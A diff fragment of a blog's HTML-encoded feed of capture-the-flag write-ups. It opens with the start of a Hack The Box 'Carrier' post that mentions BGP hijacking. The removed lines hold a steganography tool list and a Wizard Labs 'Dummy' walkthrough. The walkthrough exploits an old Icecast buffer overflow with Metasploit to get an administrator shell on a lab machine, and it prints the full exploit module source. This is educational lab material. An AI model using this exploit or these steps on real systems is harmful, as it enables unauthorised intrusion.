 &lt;h4 id=&quot;hey-guys-today-carrier-retired-and-here-is-my-write-up-about-it-user-on-this-box-wasnt-hard-to-get--but-for-root-its-a-different-thing-because-we-will-go-through-some-networking-tricks-and-we-will-perform-an-attack-called-bgp-hijacking-the-overall-experience-was-great-and-carrier-was-one-of-the-best-boxes-on-this-platfrom-its-a-linux-box-and-its-ip-is-101010105-i-added-it-to-etchosts-as-carrierhtb-lets-jump-right-in-&quot;&gt;Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.105&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;carrier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -1988,150 +2144,4 @@ system(&quot;/bin/bash&quot;);
 &lt;h4 id=&quot;root-me&quot;&gt;&lt;a href=&quot;https://www.root-me.org&quot;&gt;root me&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;ringerzeroctf&quot;&gt;&lt;a href=&quot;https://ringzer0ctf.com/challenges&quot;&gt;RingerZeroCTF&lt;/a&gt;&lt;/h4&gt;
 &lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Steganography Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources. Note : This list will be updated regularly , feel free to pm if you have any suggestions Last update : 29.1.2019 Tools Steghide Steghide is a steganography program that hides data in various kinds of image and audio files , only supports these file formats : JPEG, BMP, WAV and AU. but it’s also useful for extracting embedded and encrypted data from other files. It can be installed with apt however the source can be found on github. Useful commands: steghide info file : displays info about a file whether it has embedded data or not. steghide extract -sf file : extracts embedded data from a file Foremost Foremost is a program that recovers files based on their headers , footers and internal data structures , I find it useful when dealing with png images. It can be installed with apt however the source can be found on github. Useful commands: foremost -i file : extracts data from the given file. Stegsolve Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images. Personally i find it very useful You can get it from github Strings Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings It’s a default linux tool so you don’t need to install anything. Useful commands: strings file : displays printable strings in the given file. Exiftool Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files. You can get it from here Useful commands: exiftool file : shows the metadata of the given file Exiv2 A tool similar to exiftool. It can be installed with apt however the source can be found on github. Official website Useful commands: exiv2 file : shows the metadata of the given file Binwalk Binwalk is a tool for searching binary files like images and audio files for embedded files and data. It can be installed with apt however the source can be found on github. Useful commands: binwalk file : Displays the embedded data in the given file binwalk -e file : Displays and extracts the data from the given file Zsteg zsteg is a tool that can detect hidden data in png and bmp files. to install it : gem install zsteg , The source can be found on github Useful commands: zsteg -a file : Runs all the methods on the given file zsteg -E file : Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png) Wavsteg WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files. You can get it from github Useful commands: python3 WavSteg.py -r -s soundfile -o outputfile : extracts data from a wav sound file and outputs the data into a new file Sonic visualizer Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files. Offical Website Web Tools Unicode Text Steganography A web tool for unicode steganography , it can encode and decode text. npiet online an online interpreter for piet. piet is an esoteric language , programs in piet are images. read more about piet here dcode.fr Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful. Bruteforcers StegCracker A tool that bruteforces passwords using steghide Fcrackzip Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives. It can be installed with apt however the source can be found on github. Useful commands: fcrackzip -u -D -p wordlist.txt file.zip : bruteforces the given zip file with passwords from the given wordlist Challenges Some platforms to solve stego challenges Hack The Box root me RingerZeroCTF</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/lists/stego/0.png" /></entry><entry><title type="html">Wizard Labs - Dummy</title><link href="http://localhost:4000/wizard-labs/dummy/" rel="alternate" type="text/html" title="Wizard Labs - Dummy" /><published>2019-01-20T00:00:00+02:00</published><updated>2019-01-20T00:00:00+02:00</updated><id>http://localhost:4000/wizard-labs/dummy</id><content type="html" xml:base="http://localhost:4000/wizard-labs/dummy/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-this-is-my-write-up-about-dummy-from-wizard-labs-if-you-dont-know-them--they-are-a-new-penetration-testing-lab-they-have-16-boxes-so-far-and-dummy-is-their-first-box-to-retire-this-lab-is-nice-i-definitely-recommend-checking-it-out-dummy-is-a-windows-box-and-it-was-an-easy-one-difficulty-210-it-had-an-http-service-which-was-vulnerable-to-a-buffer-overflow--and-metasploit-had-a-module-for-it-so-this-box-can-be-done-easily-through-metasploit--i-will-show-that-then-we-will-take-a-look-at-the-exploit-and-how-its-happening-the-ip-of-the-box-is-101113-so-lets-jump-right-in&quot;&gt;Hey guys this is my write-up about Dummy from &lt;a href=&quot;https://labs.wizard-security.net/&quot;&gt;Wizard Labs&lt;/a&gt;. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-we-always-do-we-will-start-by-scanning-the-box-with-nmap--so-&quot;&gt;As we always do we will start by scanning the box with nmap , so :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC 10.1.1.13&lt;/code&gt;
-&lt;img src=&quot;/images/wizardlabs/dummy/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-see-a-lot-of-open-ports--most-of-the-http-ports-are-running-microsoft-httpapi-we-will-ignore-that-and-look-at-other-things-we-also-see-that-the-box-has-smb-which-is-an-interesting-thing-to-look-at-so-lets-try-smbmap&quot;&gt;We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -H 10.1.1.13&lt;/code&gt;
-&lt;img src=&quot;/images/wizardlabs/dummy/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-immediately-get-access-denied-so-smb-is-not-helpful-here&quot;&gt;And we immediately get Access Denied so smb is not helpful here.&lt;/h4&gt;
-&lt;h4 id=&quot;on-port-8000-theres-an-http-server-and-its-not-running-microsoft-httpapi--its-running-icecast-streaming-media-server-lets-check-that-port&quot;&gt;On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running &lt;a href=&quot;http://icecast.org/&quot;&gt;Icecast streaming media server&lt;/a&gt;. Let’s check that port&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;icecast&quot;&gt;Icecast&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;if-we-go-to-that-port-we-get-a-404-response-which-is-odd-we-can-try-bruteforcing-directories-with-dirbuster-but-that-wont-help-too-much&quot;&gt;If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much.&lt;/h4&gt;
-&lt;h4 id=&quot;by-searching-online-we-will-find-that-an-old-version-of-icecast-had-a-buffer-overflow-vulnerability-which-allowed-for-a-remote-code-execution-rce-and-we-also-find-a-metasploit-module--so-lets-open-metasploit-and-search-for-icecast-modules&quot;&gt;By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote code execution (RCE). And we also find a &lt;a href=&quot;https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header&quot;&gt;metasploit module&lt;/a&gt; . So let’s open metasploit and search for icecast modules.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h3&gt;
-&lt;h4 id=&quot;by-doing-search-icecast-we-will-find-the-module--and-its-an-exploit-from-2004&quot;&gt;By doing &lt;code class=&quot;highlighter-rouge&quot;&gt;search icecast&lt;/code&gt; we will find the module , and it’s an exploit from 2004.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/4.png&quot; alt=&quot;&quot; /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;use windows/http/icecast_header&lt;/code&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST 10.253.xx.xx&lt;/code&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;set RHOST 10.1.1.13&lt;/code&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;
-&lt;img src=&quot;/images/wizardlabs/dummy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-got-a-meterpreter-session-we-can-drop-a-shell-by-typing-shell-then-if-we-type-whoami-we-will-find-that-we-are-already-administrator-so-no-need-for-privilege-escalation&quot;&gt;And we got a meterpreter session. we can drop a shell by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt; then if we type &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; we will find that we are already Administrator so no need for privilege escalation&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-can-grab-the-flags&quot;&gt;Then we can grab the flags&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;header-overwrite&quot;&gt;Header Overwrite&lt;/h3&gt;
-&lt;h4 id=&quot;so-now-we-did-the-box--but-lets-understand-the-exploit-basically-its-a-buffer-overflow-vulnerability-it-happens-because-that-version-of-icecast-only-accepted-a-maximum-of-32-headers-in-the-http-request--so-if-a-request-had-32-headers-this-caused-the-return-address-of-the-vulnerable-function-to-be-overwritten-with-a-pointer-to-the-begining-of-the-header-number-32-this-means-that-anything-we-add-as-the-32nd-header-will-be-executed&quot;&gt;So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed&lt;/h4&gt;
-&lt;h4 id=&quot;so-if-we-make-a-request-with-31-headers-and-add-shellcode-as-the-32nd-header-we-can-get-a-reverse-shell-and-thats-what-metasploit-is-doing-but-if-we-look-at-the-source-of-the-module-&quot;&gt;So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/icecast_header.rb&quot;&gt;source&lt;/a&gt; of the module :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;##
-# This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
-##
-
-class MetasploitModule &amp;lt; Msf::Exploit::Remote
-  Rank = GreatRanking
-
-  include Msf::Exploit::Remote::Tcp
-
-  def initialize(info = {})
-    super(update_info(info,
-      'Name'           =&amp;gt; 'Icecast Header Overwrite',
-      'Description'    =&amp;gt; %q{
-        This module exploits a buffer overflow in the header parsing of icecast
-        versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32
-        HTTP headers will cause a write one past the end of a pointer array. On
-        win32 this happens to overwrite the saved instruction pointer, and on
-        linux (depending on compiler, etc) this seems to generally overwrite
-        nothing crucial (read not exploitable).
-
-        This exploit uses ExitThread(), this will leave icecast thinking the
-        thread is still in use, and the thread counter won't be decremented.
-        This means for each time your payload exits, the counter will be left
-        incremented, and eventually the threadpool limit will be maxed. So you
-        can multihit, but only till you fill the threadpool.
-      },
-      'Author'         =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ],
-      'License'        =&amp;gt; MSF_LICENSE,
-      'References'     =&amp;gt;
-        [
-          [ 'CVE', '2004-1561'],
-          [ 'OSVDB', '10406'],
-          [ 'BID', '11271'],
-          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'],
-        ],
-      'Privileged'     =&amp;gt; false,
-      'DefaultOptions' =&amp;gt;
-        {
-          'EXITFUNC' =&amp;gt; 'thread',
-        },
-      'Payload'        =&amp;gt;
-        {
-          'Space'    =&amp;gt; 2000,
-          'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;,
-          'DisableNops' =&amp;gt; true,
-          'StackAdjustment' =&amp;gt; -3500,
-        },
-      'Platform'       =&amp;gt; 'win',
-      'Targets'        =&amp;gt;
-        [
-          [ 'Automatic', { }],
-        ],
-      'DisclosureDate' =&amp;gt; 'Sep 28 2004',
-      'DefaultTarget' =&amp;gt; 0))
-
-    register_options(
-      [
-        Opt::RPORT(8000)
-      ])
-  end
-
-  # Interesting that ebp is pushed after the local variables, and the line array
-  # is right before the saved eip, so overrunning it just by 1 element overwrites
-  # eip, making an interesting exploit....
-  # .text:00414C00                 sub     esp, 94h
-  # .text:00414C06                 push    ebx
-  # .text:00414C07                 push    ebp
-  # .text:00414C08                 push    esi
-
-  def exploit
-    connect
-
-    # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance)
-    # jmp 12
-    evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot;
-    evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31;
-
-    # jmp [esp+4]
-    evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot;
-    evul &amp;lt;&amp;lt; &quot;\r\n&quot;
-
-    sock.put(evul)
-
-    handler
-    disconnect
-  end
-end
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;theres-not-much-detail-because-its-based-on-metasploit-so-luckily-i-found-this-refrence-which-had-a-poc-c-code&quot;&gt;There’s not much detail because it’s based on metasploit so luckily I found this &lt;a href=&quot;https://securitytracker.com/id/1011439&quot;&gt;refrence&lt;/a&gt; which had a poc c code.&lt;/h4&gt;
-&lt;h4 id=&quot;by-looking-at-this-part-of-the-code-&quot;&gt;By looking at this part of the code :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/wizardlabs/dummy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-can-see-how-the-exploit-is-working-its-doing-a-get-request--adding-31-as-as-headers--then-the-32nd-header-is-the-shellcode&quot;&gt;We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode.&lt;/h4&gt;
-&lt;h4 id=&quot;if-you-want-to-know-more-about-bufferoverflows-check-out-my-other-articles&quot;&gt;If you want to know more about bufferOverFlows check out my &lt;a href=&quot;/categories&quot;&gt;other articles&lt;/a&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys this is my write-up about Dummy from Wizard Labs. If you don’t know them , They are a new penetration testing lab, They have 16 boxes so far and Dummy is their first box to retire. This lab is nice I definitely recommend checking it out. Dummy is a windows box and it was an easy one (Difficulty: 2/10). It had an http service which was vulnerable to a buffer overflow , and metasploit had a module for it so this box can be done easily through metasploit . I will show that, then we will take a look at the exploit and how it’s happening. The ip of the box is 10.1.1.13 so let’s jump right in. Nmap As we always do we will start by scanning the box with nmap , so : nmap -sV -sT -sC 10.1.1.13 We see a lot of open ports , most of the http ports are running Microsoft HTTPAPI, we will ignore that and look at other things. We also see that the box has smb which is an interesting thing to look at so let’s try smbmap smbmap -H 10.1.1.13 And we immediately get Access Denied so smb is not helpful here. On port 8000 there’s an http server and it’s not running Microsoft HTTPAPI , it’s running Icecast streaming media server. Let’s check that port Icecast If we go to that port we get a 404 response which is odd. We can try bruteforcing directories with dirbuster but that won’t help too much. By searching online we will find that an old version of icecast had a buffer overflow vulnerability which allowed for a remote code execution (RCE). And we also find a metasploit module . So let’s open metasploit and search for icecast modules. Metasploit By doing search icecast we will find the module , and it’s an exploit from 2004. use windows/http/icecast_header set LHOST 10.253.xx.xx set RHOST 10.1.1.13 exploit And we got a meterpreter session. we can drop a shell by typing shell then if we type whoami we will find that we are already Administrator so no need for privilege escalation Then we can grab the flags Header Overwrite So now we did the box , but let’s understand the exploit. basically it’s a buffer overflow vulnerability, it happens because that version of icecast only accepted a maximum of 32 headers in the HTTP request , so if a request had 32 headers this caused the return address of the vulnerable function to be overwritten with a pointer to the begining of the header number 32. this means that anything we add as the 32nd header will be executed So if we make a request with 31 headers and add shellcode as the 32nd header we can get a reverse shell and that’s what metasploit is doing. But if we look at the source of the module : ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &amp;lt; Msf::Exploit::Remote Rank = GreatRanking include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(update_info(info, 'Name' =&amp;gt; 'Icecast Header Overwrite', 'Description' =&amp;gt; %q{ This module exploits a buffer overflow in the header parsing of icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. Sending 32 HTTP headers will cause a write one past the end of a pointer array. On win32 this happens to overwrite the saved instruction pointer, and on linux (depending on compiler, etc) this seems to generally overwrite nothing crucial (read not exploitable). This exploit uses ExitThread(), this will leave icecast thinking the thread is still in use, and the thread counter won't be decremented. This means for each time your payload exits, the counter will be left incremented, and eventually the threadpool limit will be maxed. So you can multihit, but only till you fill the threadpool. }, 'Author' =&amp;gt; [ 'spoonm', 'Luigi Auriemma &amp;lt;aluigi[at]autistici.org&amp;gt;' ], 'License' =&amp;gt; MSF_LICENSE, 'References' =&amp;gt; [ [ 'CVE', '2004-1561'], [ 'OSVDB', '10406'], [ 'BID', '11271'], [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html'], ], 'Privileged' =&amp;gt; false, 'DefaultOptions' =&amp;gt; { 'EXITFUNC' =&amp;gt; 'thread', }, 'Payload' =&amp;gt; { 'Space' =&amp;gt; 2000, 'BadChars' =&amp;gt; &quot;\x0d\x0a\x00&quot;, 'DisableNops' =&amp;gt; true, 'StackAdjustment' =&amp;gt; -3500, }, 'Platform' =&amp;gt; 'win', 'Targets' =&amp;gt; [ [ 'Automatic', { }], ], 'DisclosureDate' =&amp;gt; 'Sep 28 2004', 'DefaultTarget' =&amp;gt; 0)) register_options( [ Opt::RPORT(8000) ]) end # Interesting that ebp is pushed after the local variables, and the line array # is right before the saved eip, so overrunning it just by 1 element overwrites # eip, making an interesting exploit.... # .text:00414C00 sub esp, 94h # .text:00414C06 push ebx # .text:00414C07 push ebp # .text:00414C08 push esi def exploit connect # bounce bounce bouncey bounce.. (our chunk gets free'd, so do a little dance) # jmp 12 evul = &quot;\xeb\x0c / HTTP/1.1 #{payload.encoded}\r\n&quot; evul &amp;lt;&amp;lt; &quot;Accept: text/html\r\n&quot; * 31; # jmp [esp+4] evul &amp;lt;&amp;lt; &quot;\xff\x64\x24\x04\r\n&quot; evul &amp;lt;&amp;lt; &quot;\r\n&quot; sock.put(evul) handler disconnect end end There’s not much detail because it’s based on metasploit so luckily I found this refrence which had a poc c code. By looking at this part of the code : We can see how the exploit is working. It’s doing a GET request , adding 31 “a”s as headers , then the 32nd header is the shellcode. If you want to know more about bufferOverFlows check out my other articles That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/wizardlabs/dummy/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Steganography Steganography is hiding a file or a message inside of another file , there are many fun steganography CTF challenges out there where the flag is hidden in an image , audio file or even other types of files. Here is a list of the most tools I use and some other useful resources. Note : This list will be updated regularly , feel free to pm if you have any suggestions Last update : 29.1.2019 Tools Steghide Steghide is a steganography program that hides data in various kinds of image and audio files , only supports these file formats : JPEG, BMP, WAV and AU. but it’s also useful for extracting embedded and encrypted data from other files. It can be installed with apt however the source can be found on github. Useful commands: steghide info file : displays info about a file whether it has embedded data or not. steghide extract -sf file : extracts embedded data from a file Foremost Foremost is a program that recovers files based on their headers , footers and internal data structures , I find it useful when dealing with png images. It can be installed with apt however the source can be found on github. Useful commands: foremost -i file : extracts data from the given file. Stegsolve Sometimes there is a message or a text hidden in the image itself and in order to view it you need to apply some color filters or play with the color levels. You can do it with GIMP or Photoshop or any other image editing software but stegsolve made it easier. it’s a small java tool that applies many color filters on images. Personally i find it very useful You can get it from github Strings Strings is a linux tool that displays printable strings in a file. That simple tool can be very helpful when solving stego challenges. Usually the embedded data is password protected or encrypted and sometimes the password is actaully in the file itself and can be easily viewed by using strings It’s a default linux tool so you don’t need to install anything. Useful commands: strings file : displays printable strings in the given file. Exiftool Sometimes important stuff is hidden in the metadata of the image or the file , exiftool can be very helpful to view the metadata of the files. You can get it from here Useful commands: exiftool file : shows the metadata of the given file Exiv2 A tool similar to exiftool. It can be installed with apt however the source can be found on github. Official website Useful commands: exiv2 file : shows the metadata of the given file Binwalk Binwalk is a tool for searching binary files like images and audio files for embedded files and data. It can be installed with apt however the source can be found on github. Useful commands: binwalk file : Displays the embedded data in the given file binwalk -e file : Displays and extracts the data from the given file Zsteg zsteg is a tool that can detect hidden data in png and bmp files. to install it : gem install zsteg , The source can be found on github Useful commands: zsteg -a file : Runs all the methods on the given file zsteg -E file : Extracts data from the given payload (example : zsteg -E b4,bgr,msb,xy name.png) Wavsteg WavSteg is a python3 tool that can hide data and files in wav files and can also extract data from wav files. You can get it from github Useful commands: python3 WavSteg.py -r -s soundfile -o outputfile : extracts data from a wav sound file and outputs the data into a new file Sonic visualizer Sonic visualizer is a tool for viewing and analyzing the contents of audio files, however it can be helpful when dealing with audio steganography. You can reveal hidden shapes in audio files. Offical Website Web Tools Unicode Text Steganography A web tool for unicode steganography , it can encode and decode text. npiet online an online interpreter for piet. piet is an esoteric language , programs in piet are images. read more about piet here dcode.fr Sometimes when solving steganography challenges you will need to decode some text. dcode.fr has many decoders for a lot of ciphers and can be really helpful. Bruteforcers StegCracker A tool that bruteforces passwords using steghide Fcrackzip Sometimes the extracted data is a password protected zip , this tool bruteforces zip archives. It can be installed with apt however the source can be found on github. Useful commands: fcrackzip -u -D -p wordlist.txt file.zip : bruteforces the given zip file with passwords from the given wordlist Challenges Some platforms to solve stego challenges Hack The Box root me RingerZeroCTF</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/lists/stego/0.png" /></entry></feed>
